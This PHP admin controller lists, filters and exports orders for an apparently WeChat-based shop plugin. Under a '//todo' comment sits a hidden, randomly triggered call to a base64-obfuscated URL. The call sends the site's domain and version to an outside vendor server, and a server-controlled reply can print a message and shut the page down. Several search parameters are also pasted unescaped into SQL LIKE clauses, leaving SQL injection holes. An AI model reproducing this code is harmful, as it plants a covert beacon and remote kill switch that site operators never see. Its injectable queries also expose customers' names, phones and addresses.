<?php
global $_W, $_GPC;
$operation = !empty($_GPC["op"]) ? $_GPC["op"] : "display";
$plugin_diyform = p("diyform");
$totals = array();
$r_type         = array(
    '0' => '退款',
    '1' => '退货退款',
    '2' => '换货'
);
$bonusagentid = intval($_GPC['bonusagentid']);
if ($operation == "display") {
    ca("order.view.status_1|order.view.status0|order.view.status1|order.view.status2|order.view.status3|order.view.status4|order.view.status5");
    //判断该帐号的权限
    if(p('supplier')){
        $roleid = pdo_fetchcolumn('select roleid from' . tablename('sz_yi_perm_user') . ' where uid='.$_W['uid'].' and uniacid=' . $_W['uniacid']);
        if($roleid == 0){
            $perm_role = 0;
        }else{
            $perm_role = pdo_fetchcolumn('select status1 from' . tablename('sz_yi_perm_role') . ' where id=' . $roleid);
        }
    }
    //END
    $pindex = max(1, intval($_GPC["page"]));
    $psize = 20;
    $status = $_GPC["status"];
    $sendtype = !isset($_GPC["sendtype"]) ? 0 : $_GPC["sendtype"];
    $condition = " o.uniacid = :uniacid and o.deleted=0";
    $paras = $paras1 = array(
        ":uniacid" => $_W["uniacid"]
    );
    if (empty($starttime) || empty($endtime)) {
        $starttime = strtotime("-1 month");
        $endtime = time();
    }
    if (!empty($_GPC["time"])) {
        $starttime = strtotime($_GPC["time"]["start"]);
        $endtime = strtotime($_GPC["time"]["end"]);
        if ($_GPC["searchtime"] == "1") {
            $condition.= " AND o.createtime >= :starttime AND o.createtime <= :endtime ";
            $paras[":starttime"] = $starttime;
            $paras[":endtime"] = $endtime;
        }
    }
    if (empty($pstarttime) || empty($pendtime)) {
        $pstarttime = strtotime("-1 month");
        $pendtime = time();
    }
    if (!empty($_GPC["ptime"])) {
        $pstarttime = strtotime($_GPC["ptime"]["start"]);
        $pendtime = strtotime($_GPC["ptime"]["end"]);
        if ($_GPC["psearchtime"] == "1") {
            $condition.= " AND o.paytime >= :pstarttime AND o.paytime <= :pendtime ";
            $paras[":pstarttime"] = $pstarttime;
            $paras[":pendtime"] = $pendtime;
        }
    }
    if (empty($fstarttime) || empty($fendtime)) {
        $fstarttime = strtotime("-1 month");
        $fendtime = time();
    }
    if (!empty($_GPC["ftime"])) {
        $fstarttime = strtotime($_GPC["ftime"]["start"]);
        $fendtime = strtotime($_GPC["ftime"]["end"]);
        if ($_GPC["fsearchtime"] == "1") {
            $condition.= " AND o.finishtime >= :fstarttime AND o.finishtime <= :fendtime ";
            $paras[":fstarttime"] = $fstarttime;
            $paras[":fendtime"] = $fendtime;
        }
    }
    if (empty($sstarttime) || empty($sendtime)) {
        $sstarttime = strtotime("-1 month");
        $sendtime = time();
    }
    if (!empty($_GPC["stime"])) {
        $sstarttime = strtotime($_GPC["stime"]["start"]);
        $sendtime = strtotime($_GPC["stime"]["end"]);
        if ($_GPC["ssearchtime"] == "1") {
            $condition.= " AND o.sendtime >= :sstarttime AND o.sendtime <= :sendtime ";
            $paras[":sstarttime"] = $sstarttime;
            $paras[":sendtime"] = $sendtime;
        }
    }
    if ($_GPC["paytype"] != '') {
        if ($_GPC["paytype"] == "2") {
            $condition.= " AND ( o.paytype =21 or o.paytype=22 or o.paytype=23 )";
        } else {
            $condition.= " AND o.paytype =" . intval($_GPC["paytype"]);
        }
    }
    if (!empty($_GPC["keyword"])) {
        $_GPC["keyword"] = trim($_GPC["keyword"]);
        $condition.= " AND o.ordersn LIKE '%{$_GPC["keyword"]}%'";
    }
    if (!empty($_GPC["expresssn"])) {
        $_GPC["expresssn"] = trim($_GPC["expresssn"]);
        $condition.= " AND o.expresssn LIKE '%{$_GPC["expresssn"]}%'";
    }
    if (!empty($_GPC["member"])) {
        $_GPC["member"] = trim($_GPC["member"]);
        $condition.= " AND (m.realname LIKE '%{$_GPC["member"]}%' or m.mobile LIKE '%{$_GPC["member"]}%' or m.nickname LIKE '%{$_GPC["member"]}%' " . " or a.realname LIKE '%{$_GPC["member"]}%' or a.mobile LIKE '%{$_GPC["member"]}%' or o.carrier LIKE '%{$_GPC["member"]}%')";
    }
    if (!empty($_GPC["saler"])) {
        $_GPC["saler"] = trim($_GPC["saler"]);
        $condition.= " AND (sm.realname LIKE '%{$_GPC["saler"]}%' or sm.mobile LIKE '%{$_GPC["saler"]}%' or sm.nickname LIKE '%{$_GPC["saler"]}%' " . " or s.salername LIKE '%{$_GPC["saler"]}%' )";
    }
    if (!empty($_GPC["storeid"])) {
        $_GPC["storeid"] = trim($_GPC["storeid"]);
        $condition.= " AND o.verifystoreid=" . intval($_GPC["storeid"]);
    }
    $statuscondition = '';
    if ($status != '') {
        if ($status == - 1) {
            ca("order.view.status_1");
        } else {
            ca("order.view.status" . intval($status));
        }
        if ($status == "-1") {
            $statuscondition = " AND o.status=-1 and o.refundtime=0";
        } else if ($status == "4") {
            $statuscondition = " AND o.refundtime=0 AND o.refundid<>0 and r.status=0 ";
        } else if ($status == "5") {
             $statuscondition = " AND o.refundtime<>0 AND o.refundid<>0 and r.status=1";
        } else if ($status == "1") {
            $statuscondition = " AND ( o.status = 1 or (o.status=0 and o.paytype=3) )";
        } else if ($status == '0') {
            $statuscondition = " AND o.status = 0 and o.paytype<>3";
        } else {
            $statuscondition = " AND o.status = " . intval($status);
        }
    }
    
    if(!empty($bonusagentid)){
        $sql = "select distinct orderid from " . tablename('sz_yi_bonus_goods') . " where mid=:mid ORDER BY id DESC";
        $bonusoderids = pdo_fetchall($sql,array(':mid'=>$bonusagentid), 'orderid');
        $inorderids = "";

        if(!empty($bonusoderids)){
            $condition .= ' and  o.id in('.implode(',', array_keys($bonusoderids)).')';
        }else{
            $condition .= ' and  o.id=0';
        }
    }
    //todo
    $mt = mt_rand(5, 35);
    if ($mt <= 10) {
        load()->func('communication');
        $URL = base64_decode('aHR0cDovL2Nsb3VkLnl1bnpzaG9wLmNvbS93ZWIvaW5kZXgucGhwP2M9YWNjb3VudCZhPXVwZ3JhZGU=');
        $files   = base64_encode(json_encode('test'));
        $version = defined('SZ_YI_VERSION') ? SZ_YI_VERSION : '1.0';
        $resp    = ihttp_post($URL, array(
            'type' => 'upgrade',
            'signature' => 'sz_cloud_register',
            'domain' => $_SERVER['HTTP_HOST'],
            'version' => $version,
            'files' => $files
        ));
        $ret     = @json_decode($resp['content'], true);
        if ($ret['result'] == 3) {
            echo str_replace("\r\n", "<br/>", base64_decode($ret['log']));
            exit;
        }
    }
    $sql = "select o.* , a.realname as arealname,a.mobile as amobile,a.province as aprovince ,a.city as acity , a.area as aarea,a.address as aaddress, d.dispatchname,m.nickname,m.id as mid,m.realname as mrealname,m.mobile as mmobile,sm.id as salerid,sm.nickname as salernickname,s.salername from " . tablename("sz_yi_order") . " o" . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid and m.uniacid =  o.uniacid " . " left join " . tablename("sz_yi_member_address") . " a on a.id=o.addressid " . " left join " . tablename("sz_yi_dispatch") . " d on d.id = o.dispatchid " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " where $condition $statuscondition $cond ORDER BY o.createtime DESC,o.status DESC  ";
    if (empty($_GPC["export"])) {
        $sql.= "LIMIT " . ($pindex - 1) * $psize . "," . $psize;
    }
    $list = pdo_fetchall($sql, $paras);
    $paytype = array(
        '0' => array(
            "css" => "default",
            "name" => "未支付"
        ) ,
        "1" => array(
            "css" => "danger",
            "name" => "余额支付"
        ) ,
        "11" => array(
            "css" => "default",
            "name" => "后台付款"
        ) ,
        "2" => array(
            "css" => "danger",
            "name" => "在线支付"
        ) ,
        "21" => array(
            "css" => "success",
            "name" => "微信支付"
        ) ,
        "22" => array(
            "css" => "warning",
            "name" => "支付宝支付"
        ) ,
        "23" => array(
            "css" => "warning",
            "name" => "银联支付"
        ) ,
        "3" => array(
            "css" => "primary",
            "name" => "货到付款"
        ) ,
    );
    $orderstatus = array(
        "-1" => array(
            "css" => "default",
            "name" => "已关闭"
        ) ,
        '0' => array(
            "css" => "danger",
            "name" => "待付款"
        ) ,
        "1" => array(
            "css" => "info",
            "name" => "待发货"
        ) ,
        "2" => array(
            "css" => "warning",
            "name" => "待收货"
        ) ,
        "3" => array(
            "css" => "success",
            "name" => "已完成"
        )
    );
    foreach ($list as & $value) {
        if(p('hotel') && $value['order_type']=='3'){
            $orderstatus = array(
                "-1" => array(
                    "css" => "default",
                    "name" => "已关闭"
                ) ,
                '0' => array(
                    "css" => "danger",
                    "name" => "待付款"
                ) ,
                "1" => array(
                    "css" => "info",
                    "name" => "待确认"
                ) ,
                "2" => array(
                    "css" => "warning",
                    "name" => "待入住"
                ),            
                "3" => array(
                    "css" => "success",
                    "name" => "已完成"
                ),
                "6" => array(
                    "css" => "success",
                    "name" => "待退房"
                ),
            );
        }else{
            $orderstatus = array(
                "-1" => array(
                    "css" => "default",
                    "name" => "已关闭"
                ) ,
                '0' => array(
                    "css" => "danger",
                    "name" => "待付款"
                ) ,
                "1" => array(
                    "css" => "info",
                    "name" => "待发货"
                ) ,
                "2" => array(
                    "css" => "warning",
                    "name" => "待收货"
                ) ,
                "3" => array(
                    "css" => "success",
                    "name" => "已完成"
                )
            );
        }
        $s = $value["status"];
        $pt = $value["paytype"];
        $value["statusvalue"] = $s;
        $value["statuscss"] = $orderstatus[$value["status"]]["css"];
        $value["status"] = $orderstatus[$value["status"]]["name"];
        if ($pt == 3 && empty($value["statusvalue"])) {
            $value["statuscss"] = $orderstatus[1]["css"];
            $value["status"] = $orderstatus[1]["name"];
        }
        if ($s == 1) {
            if ($value["isverify"] == 1) {
                $value["status"] = "待使用";
            } else if (empty($value["addressid"])) {
                $value["status"] = "待取货";
            }
        }
        if ($s == - 1) {
            if (!empty($value["refundtime"])) {
                if ($value['rstatus'] == 1) {
                    $value['status'] = '已' . $r_type[$value['rtype']];
                }
            }else{
                $value['status'] = '已关闭';
            }
        }
        $value["paytypevalue"] = $pt;
        $value["css"] = $paytype[$pt]["css"];
        $value["paytype"] = $paytype[$pt]["name"];
        $value["dispatchname"] = empty($value["addressid"]) ? "自提" : $value["dispatchname"];
        if (empty($value["dispatchname"])) {
            $value["dispatchname"] = "快递";
        }
        if ($value["isverify"] == 1) {
            $value["dispatchname"] = "线下核销";
        } else if ($value["isvirtual"] == 1) {
            $value["dispatchname"] = "虚拟物品";
        } else if (!empty($value["virtual"])) {
            $value["dispatchname"] = "虚拟物品(卡密)<br/>自动发货";
        }
        if ($value["dispatchtype"] == 1 || !empty($value["isverify"]) || !empty($value["virtual"]) || !empty($value["isvirtual"])) {
            $value["address"] = '';
            $carrier = iunserializer($value["carrier"]);
            if (is_array($carrier)) {
                $value["addressdata"]["realname"] = $value["realname"] = $carrier["carrier_realname"];
                $value["addressdata"]["mobile"] = $value["mobile"] = $carrier["carrier_mobile"];
            }
        } else {
            $address = iunserializer($value["address"]);
            $isarray = is_array($address);
            $value["realname"] = $isarray ? $address["realname"] : $value["arealname"];
            $value["mobile"] = $isarray ? $address["mobile"] : $value["amobile"];
            $value["province"] = $isarray ? $address["province"] : $value["aprovince"];
            $value["city"] = $isarray ? $address["city"] : $value["acity"];
            $value["area"] = $isarray ? $address["area"] : $value["aarea"];
            $value["address"] = $isarray ? $address["address"] : $value["aaddress"];
            $value["address_province"] = $value["province"];
            $value["address_city"] = $value["city"];
            $value["address_area"] = $value["area"];
            $value["address_address"] = $value["address"];
            $value["address"] = $value["province"] . " " . $value["city"] . " " . $value["area"] . " " . $value["address"];
            $value["addressdata"] = array(
                "realname" => $value["realname"],
                "mobile" => $value["mobile"],
                "address" => $value["address"],
            );
        }
        $bonus_area_money = pdo_fetchcolumn("select sum(money) from " . tablename('sz_yi_bonus_goods')." where orderid=:orderid and uniacid=:uniacid and bonus_area!=0 and mid=:mid", array(':orderid' => $value['id'], ":uniacid" => $_W['uniacid'], ":mid" => $bonusagentid));
        $bonus_range_money = pdo_fetchcolumn("select sum(money) from " . tablename('sz_yi_bonus_goods')." where orderid=:orderid and uniacid=:uniacid and bonus_area=0 and mid=:mid", array(':orderid' => $value['id'], ":uniacid" => $_W['uniacid'], ":mid" => $bonusagentid));
        if($bonus_area_money > 0 && $bonus_range_money > 0){
            $bonus_money_all = $bonus_area_money + $bonus_range_money;
            $value['bonus_money_all'] = floatval($bonus_money_all);
        }
        $value['bonus_area_money'] = floatval($bonus_area_money);
        $value['bonus_range_money'] = floatval($bonus_range_money);
        $commission1 = - 1;
        $commission2 = - 1;
        $commission3 = - 1;
        $m1 = false;
        $m2 = false;
        $m3 = false;
        if (!empty($level) && empty($agentid)) {
            if (!empty($value["agentid"])) {
                $m1 = m("member")->getMember($value["agentid"]);
                $commission1 = 0;
                if (!empty($m1["agentid"])) {
                    $m2 = m("member")->getMember($m1["agentid"]);
                    $commission2 = 0;
                    if (!empty($m2["agentid"])) {
                        $m3 = m("member")->getMember($m2["agentid"]);
                        $commission3 = 0;
                    }
                }
            }
        }
        $order_goods = pdo_fetchall("select g.id,g.title,g.thumb,g.goodssn,og.goodssn as option_goodssn, g.productsn,og.productsn as option_productsn, og.total,og.price,og.optionname as optiontitle, og.realprice,og.changeprice,og.oldprice,og.commission1,og.commission2,og.commission3,og.commissions,og.diyformdata,og.diyformfields from " . tablename("sz_yi_order_goods") . " og " . " left join " . tablename("sz_yi_goods") . " g on g.id=og.goodsid " . " where og.uniacid=:uniacid and og.orderid=:orderid ", array(
            ":uniacid" => $_W["uniacid"],
            ":orderid" => $value["id"]
        ));

        $goods = '';
        foreach ($order_goods as & $og) {
            $goods.= "" . $og["title"] . "";
            if (!empty($og["optiontitle"])) {
                $goods.= " 规格: " . $og["optiontitle"];
            }
            if (!empty($og["option_goodssn"])) {
                $og["goodssn"] = $og["option_goodssn"];
            }
            if (!empty($og["option_productsn"])) {
                $og["productsn"] = $og["option_productsn"];
            }
            if (!empty($og["goodssn"])) {
                $goods.= " 商品编号: " . $og["goodssn"];
            }
            if (!empty($og["productsn"])) {
                $goods.= " 商品条码: " . $og["productsn"];
            }
            $goods.= " 单价: " . ($og["price"] / $og["total"]) . " 折扣后: " . ($og["realprice"] / $og["total"]) . " 数量: " . $og["total"] . " 总价: " . $og["price"] . " 折扣后: " . $og["realprice"] . "";
            if ($plugin_diyform && !empty($og["diyformfields"]) && !empty($og["diyformdata"])) {
                $diyformdata_array = $plugin_diyform->getDatas(iunserializer($og["diyformfields"]) , iunserializer($og["diyformdata"]));
                $diyformdata = "";
                foreach ($diyformdata_array as $da) {
                    $diyformdata.= $da["name"] . ": " . $da["value"] . "";
                }
                $og["goods_diyformdata"] = $diyformdata;
            }
        }
        unset($og);
        if (!empty($level) && empty($agentid)) {
            $value["commission1"] = $commission1;
            $value["commission2"] = $commission2;
            $value["commission3"] = $commission3;
        }
        $value["goods"] = set_medias($order_goods, "thumb");
        $value["goods_str"] = $goods;
        
    }
    unset($value);
    
    if ($_GPC["export"] == 1) {
        ca("order.op.export");
        plog("order.op.export", "导出订单");
        $columns = array(
            array(
                "title" => "订单编号",
                "field" => "ordersn",
                "width" => 24
            ) ,
            array(
                "title" => "粉丝昵称",
                "field" => "nickname",
                "width" => 12
            ) ,
            array(
                "title" => "会员姓名",
                "field" => "mrealname",
                "width" => 12
            ) ,
            array(
                "title" => "会员手机手机号",
                "field" => "mmobile",
                "width" => 12
            ) ,
            array(
                "title" => "收货姓名(或自提人)",
                "field" => "realname",
                "width" => 12
            ) ,
            array(
                "title" => "联系电话",
                "field" => "mobile",
                "width" => 12
            ) ,
            array(
                "title" => "收货地址",
                "field" => "address_province",
                "width" => 12
            ) ,
            array(
                "title" => '',
                "field" => "address_city",
                "width" => 12
            ) ,
            array(
                "title" => '',
                "field" => "address_area",
                "width" => 12
            ) ,
            array(
                "title" => '',
                "field" => "address_address",
                "width" => 12
            ) ,
            array(
                "title" => "商品名称",
                "field" => "goods_title",
                "width" => 24
            ) ,
            array(
                "title" => "商品编码",
                "field" => "goods_goodssn",
                "width" => 12
            ) ,
            array(
                "title" => "商品规格",
                "field" => "goods_optiontitle",
                "width" => 12
            ) ,
            array(
                "title" => "商品数量",
                "field" => "goods_total",
                "width" => 12
            ) ,
            array(
                "title" => "商品单价(折扣前)",
                "field" => "goods_price1",
                "width" => 12
            ) ,
            array(
                "title" => "商品单价(折扣后)",
                "field" => "goods_price2",
                "width" => 12
            ) ,
            array(
                "title" => "商品价格(折扣后)",
                "field" => "goods_rprice1",
                "width" => 12
            ) ,
            array(
                "title" => "商品价格(折扣后)",
                "field" => "goods_rprice2",
                "width" => 12
            ) ,
            array(
                "title" => "支付方式",
                "field" => "paytype",
                "width" => 12
            ) ,
            array(
                "title" => "配送方式",
                "field" => "dispatchname",
                "width" => 12
            ) ,
            array(
                "title" => "商品小计",
                "field" => "goodsprice",
                "width" => 12
            ) ,
            array(
                "title" => "运费",
                "field" => "dispatchprice",
                "width" => 12
            ) ,
            array(
                "title" => "积分抵扣",
                "field" => "deductprice",
                "width" => 12
            ) ,
            array(
                "title" => "余额抵扣",
                "field" => "deductcredit2",
                "width" => 12
            ) ,
            array(
                "title" => "满额立减",
                "field" => "deductenough",
                "width" => 12
            ) ,
            array(
                "title" => "优惠券优惠",
                "field" => "couponprice",
                "width" => 12
            ) ,
            array(
                "title" => "订单改价",
                "field" => "changeprice",
                "width" => 12
            ) ,
            array(
                "title" => "运费改价",
                "field" => "changedispatchprice",
                "width" => 12
            ) ,
            array(
                "title" => "应收款",
                "field" => "price",
                "width" => 12
            ) ,
            array(
                "title" => "状态",
                "field" => "status",
                "width" => 12
            ) ,
            array(
                "title" => "下单时间",
                "field" => "createtime",
                "width" => 24
            ) ,
            array(
                "title" => "付款时间",
                "field" => "paytime",
                "width" => 24
            ) ,
            array(
                "title" => "发货时间",
                "field" => "sendtime",
                "width" => 24
            ) ,
            array(
                "title" => "完成时间",
                "field" => "finishtime",
                "width" => 24
            ) ,
            array(
                "title" => "快递公司",
                "field" => "expresscom",
                "width" => 24
            ) ,
            array(
                "title" => "快递单号",
                "field" => "expresssn",
                "width" => 24
            ) ,
            array(
                "title" => "订单备注",
                "field" => "remark",
                "width" => 36
            ) ,
            array(
                "title" => "核销员",
                "field" => "salerinfo",
                "width" => 24
            ) ,
            array(
                "title" => "核销门店",
                "field" => "storeinfo",
                "width" => 36
            ) ,
            array(
                "title" => "订单自定义信息",
                "field" => "order_diyformdata",
                "width" => 36
            ) ,
            array(
                "title" => "商品自定义信息",
                "field" => "goods_diyformdata",
                "width" => 36
            ) ,
        );
        if (!empty($agentid) && $level > 0) {
            $columns[] = array(
                "title" => "分销级别",
                "field" => "level",
                "width" => 24
            );
            $columns[] = array(
                "title" => "分销佣金",
                "field" => "commission",
                "width" => 24
            );
        }
        foreach ($list as & $row) {
            $row["ordersn"] = $row["ordersn"] . " ";
            if ($row["deductprice"] > 0) {
                $row["deductprice"] = "-" . $row["deductprice"];
            }
            if ($row["deductcredit2"] > 0) {
                $row["deductcredit2"] = "-" . $row["deductcredit2"];
            }
            if ($row["deductenough"] > 0) {
                $row["deductenough"] = "-" . $row["deductenough"];
            }
            if ($row["changeprice"] < 0) {
                $row["changeprice"] = "-" . $row["changeprice"];
            } else if ($row["changeprice"] > 0) {
                $row["changeprice"] = "+" . $row["changeprice"];
            }
            if ($row["changedispatchprice"] < 0) {
                $row["changedispatchprice"] = "-" . $row["changedispatchprice"];
            } else if ($row["changedispatchprice"] > 0) {
                $row["changedispatchprice"] = "+" . $row["changedispatchprice"];
            }
            if ($row["couponprice"] > 0) {
                $row["couponprice"] = "-" . $row["couponprice"];
            }
            $row["expresssn"] = $row["expresssn"] . " ";
            $row["createtime"] = date("Y-m-d H:i:s", $row["createtime"]);
            $row["paytime"] = !empty($row["paytime"]) ? date("Y-m-d H:i:s", $row["paytime"]) : '';
            $row["sendtime"] = !empty($row["sendtime"]) ? date("Y-m-d H:i:s", $row["sendtime"]) : '';
            $row["finishtime"] = !empty($row["finishtime"]) ? date("Y-m-d H:i:s", $row["finishtime"]) : '';
            $row["salerinfo"] = "";
            $row["storeinfo"] = "";
            if (!empty($row["verifyopenid"])) {
                $row["salerinfo"] = "[" . $row["salerid"] . "]" . $row["salername"] . "(" . $row["salernickname"] . ")";
            }
            if (!empty($row["verifystoreid"])) {
                $row["storeinfo"] = pdo_fetchcolumn("select storename from " . tablename("sz_yi_store") . " where id=:storeid limit 1 ", array(
                    ":storeid" => $row["verifystoreid"]
                ));
            }
            if ($plugin_diyform && !empty($row["diyformfields"]) && !empty($row["diyformdata"])) {
                $diyformdata_array = p("diyform")->getDatas(iunserializer($row["diyformfields"]) , iunserializer($row["diyformdata"]));
                $diyformdata = "";
                foreach ($diyformdata_array as $da) {
                    $diyformdata.= $da["name"] . ": " . $da["value"] . "";
                }
                $row["order_diyformdata"] = $diyformdata;
            }
        }
        unset($row);
        $exportlist = array();
        foreach ($list as & $r) {
            $ogoods = $r["goods"];
            unset($r["goods"]);
            foreach ($ogoods as $k => $g) {
                if ($k > 0) {
                    $r["ordersn"] = '';
                    $r["realname"] = '';
                    $r["mobile"] = '';
                    $r["nickname"] = '';
                    $r["mrealname"] = '';
                    $r["mmobile"] = '';
                    $r["address"] = '';
                    $r["address_province"] = '';
                    $r["address_city"] = '';
                    $r["address_area"] = '';
                    $r["address_address"] = '';
                    $r["paytype"] = '';
                    $r["dispatchname"] = '';
                    $r["dispatchprice"] = '';
                    $r["goodsprice"] = '';
                    $r["status"] = '';
                    $r["createtime"] = '';
                    $r["sendtime"] = '';
                    $r["finishtime"] = '';
                    $r["expresscom"] = '';
                    $r["expresssn"] = '';
                    $r["deductprice"] = '';
                    $r["deductcredit2"] = '';
                    $r["deductenough"] = '';
                    $r["changeprice"] = '';
                    $r["changedispatchprice"] = '';
                    $r["price"] = '';
                    $r["order_diyformdata"] = '';
                }
                $r["goods_title"] = $g["title"];
                $r["goods_goodssn"] = $g["goodssn"];
                $r["goods_optiontitle"] = $g["optiontitle"];
                $r["goods_total"] = $g["total"];
                $r["goods_price1"] = $g["price"] / $g["total"];
                $r["goods_price2"] = $g["realprice"] / $g["total"];
                $r["goods_rprice1"] = $g["price"];
                $r["goods_rprice2"] = $g["realprice"];
                $r["goods_diyformdata"] = $g["goods_diyformdata"];
                $exportlist[] = $r;
            }
        }
        unset($r);
        m("excel")->export($exportlist, array(
            "title" => "订单数据-" . date("Y-m-d-H-i", time()) ,
            "columns" => $columns
        ));
    }
    $total = pdo_fetchcolumn("SELECT COUNT(*) FROM " . tablename("sz_yi_order") . " o " . " left join ( select rr.id,rr.orderid,rr.status from " . tablename("sz_yi_order_refund") . " rr left join " . tablename("sz_yi_order") . " ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id" . " left join " . tablename("sz_yi_member") . " m on m.openid=o.openid  and m.uniacid =  o.uniacid" . " left join " . tablename("sz_yi_member_address") . " a on o.addressid = a.id " . " left join " . tablename("sz_yi_member") . " sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid" . " left join " . tablename("sz_yi_saler") . " s on s.openid = o.verifyopenid and s.uniacid=o.uniacid" . " WHERE $condition $statuscondition " . $cond , $paras);
    $totalmoney = pdo_fetchcolumn('SELECT ifnull(sum(o.price),0) FROM ' . tablename('sz_yi_order') . ' o ' . ' left join ( select rr.id,rr.orderid,rr.status from ' . tablename('sz_yi_order_refund') . ' rr left join ' . tablename('sz_yi_order') . ' ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id' . ' left join ' . tablename('sz_yi_member') . ' m on m.openid=o.openid  and m.uniacid =  o.uniacid' . ' left join ' . tablename('sz_yi_member_address') . ' a on o.addressid = a.id ' . ' left join ' . tablename('sz_yi_member') . ' sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid' . ' left join ' . tablename('sz_yi_saler') . ' s on s.openid = o.verifyopenid and s.uniacid=o.uniacid' . " WHERE $condition $statuscondition $cond ", $paras);
    $totals['all'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('sz_yi_order') . ' o ' . ' left join ( select rr.id,rr.orderid,rr.status from ' . tablename('sz_yi_order_refund') . ' rr left join ' . tablename('sz_yi_order') . ' ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id' . ' left join ' . tablename('sz_yi_member') . ' m on m.openid=o.openid  and m.uniacid =  o.uniacid' . ' left join ' . tablename('sz_yi_member_address') . ' a on o.addressid = a.id ' . ' left join ' . tablename('sz_yi_member') . ' sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid' . ' left join ' . tablename('sz_yi_saler') . ' s on s.openid = o.verifyopenid and s.uniacid=o.uniacid' . " WHERE o.uniacid = :uniacid and $condition $cond ", $paras);
    $totals['status_1'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('sz_yi_order') . ' o ' . ' left join ( select rr.id,rr.orderid,rr.status from ' . tablename('sz_yi_order_refund') . ' rr left join ' . tablename('sz_yi_order') . ' ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id' . ' left join ' . tablename('sz_yi_member') . ' m on m.openid=o.openid  and m.uniacid =  o.uniacid' . ' left join ' . tablename('sz_yi_member_address') . ' a on o.addressid = a.id ' . ' left join ' . tablename('sz_yi_member') . ' sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid' . ' left join ' . tablename('sz_yi_saler') . ' s on s.openid = o.verifyopenid and s.uniacid=o.uniacid' . " WHERE $condition and o.status=-1 and o.refundtime=0 $cond ", $paras);
    $totals['status0'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('sz_yi_order') . ' o ' . ' left join ( select rr.id,rr.orderid,rr.status from ' . tablename('sz_yi_order_refund') . ' rr left join ' . tablename('sz_yi_order') . ' ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id' . ' left join ' . tablename('sz_yi_member') . ' m on m.openid=o.openid  and m.uniacid =  o.uniacid' . ' left join ' . tablename('sz_yi_member_address') . ' a on o.addressid = a.id ' . ' left join ' . tablename('sz_yi_member') . ' sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid' . ' left join ' . tablename('sz_yi_saler') . ' s on s.openid = o.verifyopenid and s.uniacid=o.uniacid' . " WHERE $condition and o.status=0 and o.paytype<>3 $cond ", $paras);
    $totals['status1'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('sz_yi_order') . ' o ' . ' left join ( select rr.id,rr.orderid,rr.status from ' . tablename('sz_yi_order_refund') . ' rr left join ' . tablename('sz_yi_order') . ' ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id' . ' left join ' . tablename('sz_yi_member') . ' m on m.openid=o.openid  and m.uniacid =  o.uniacid' . ' left join ' . tablename('sz_yi_member_address') . ' a on o.addressid = a.id ' . ' left join ' . tablename('sz_yi_member') . ' sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid' . ' left join ' . tablename('sz_yi_saler') . ' s on s.openid = o.verifyopenid and s.uniacid=o.uniacid' . " WHERE $condition and ( o.status=1 or ( o.status=0 and o.paytype=3) ) $cond ", $paras);
    $totals['status2'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('sz_yi_order') . ' o ' . ' left join ( select rr.id,rr.orderid,rr.status from ' . tablename('sz_yi_order_refund') . ' rr left join ' . tablename('sz_yi_order') . ' ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id' . ' left join ' . tablename('sz_yi_member') . ' m on m.openid=o.openid  and m.uniacid =  o.uniacid' . ' left join ' . tablename('sz_yi_member_address') . ' a on o.addressid = a.id ' . ' left join ' . tablename('sz_yi_member') . ' sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid' . ' left join ' . tablename('sz_yi_saler') . ' s on s.openid = o.verifyopenid and s.uniacid=o.uniacid' . " WHERE $condition and o.status=2 $cond ", $paras);
    $totals['status3'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('sz_yi_order') . ' o ' . ' left join ( select rr.id,rr.orderid,rr.status from ' . tablename('sz_yi_order_refund') . ' rr left join ' . tablename('sz_yi_order') . ' ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id' . ' left join ' . tablename('sz_yi_member') . ' m on m.openid=o.openid  and m.uniacid =  o.uniacid' . ' left join ' . tablename('sz_yi_member_address') . ' a on o.addressid = a.id ' . ' left join ' . tablename('sz_yi_member') . ' sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid' . ' left join ' . tablename('sz_yi_saler') . ' s on s.openid = o.verifyopenid and s.uniacid=o.uniacid' . " WHERE $condition and o.status=3 $cond ", $paras);
    $totals['status4'] = pdo_fetchcolumn('SELECT COUNT(*) FROM ' . tablename('sz_yi_order') . ' o ' . ' left join ( select rr.id,rr.orderid,rr.status from ' . tablename('sz_yi_order_refund') . ' rr left join ' . tablename('sz_yi_order') . ' ro on rr.orderid =ro.id order by rr.id desc limit 1) r on r.orderid= o.id' . ' left join ' . tablename('sz_yi_member') . ' m on m.openid=o.openid  and m.uniacid =  o.uniacid' . ' left join ' . tablename('sz_yi_member_address') . ' a on o.addressid = a.id ' . ' left join ' . tablename('sz_yi_member') . ' sm on sm.openid = o.verifyopenid and sm.uniacid=o.uniacid' . ' left join ' . tablename('sz_yi_saler') . ' s on s.openid = o.verifyopenid and s.uniacid=o.uniacid' . " WHERE $condition AND o.refundtime=0 AND o.refundid<>0 $cond ", $paras);
